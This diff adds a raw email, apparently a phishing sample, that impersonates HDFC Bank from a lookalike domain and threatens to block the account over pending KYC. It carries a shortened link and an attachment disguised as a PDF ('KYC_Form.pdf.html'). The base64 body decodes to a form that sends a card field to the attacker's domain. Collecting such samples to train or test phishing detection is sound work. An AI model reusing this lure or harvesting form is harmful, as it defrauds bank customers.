@@ -1,0 +1,33 @@
+Received: from smtp.hdfc-kyc-update.in (smtp.hdfc-kyc-update.in [103.21.58.14])
+	by mx.gmail.com with ESMTPS; Thu, 02 Oct 2025 19:02:10 +0530
+Authentication-Results: mx.google.com;
+	spf=pass smtp.mailfrom=hdfc-kyc-update.in;
+	dkim=pass header.d=hdfc-kyc-update.in;
+	dmarc=none
+From: HDFC Bank <kyc@hdfc-kyc-update.in>
+Reply-To: hdfc.kyc.desk@gmail.com
+To: customer@gmail.com
+Subject: Final notice: complete your KYC or your account will be blocked
+Date: Thu, 02 Oct 2025 19:02:05 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="kyc"
+
+--kyc
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer,
+
+Your KYC is pending. Complete it urgently to avoid account suspension.
+Update here: https://tinyurl.com/hdfc-kyc-now
+Or open the attached form and submit your details.
+
+HDFC Bank
+
+--kyc
+Content-Type: text/html; name="KYC_Form.pdf.html"
+Content-Disposition: attachment; filename="KYC_Form.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL2hkZmMta3ljLXVwZGF0ZS5pbi9z
+dWJtaXQiPjxpbnB1dCBuYW1lPSJjYXJkIj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=
+--kyc--
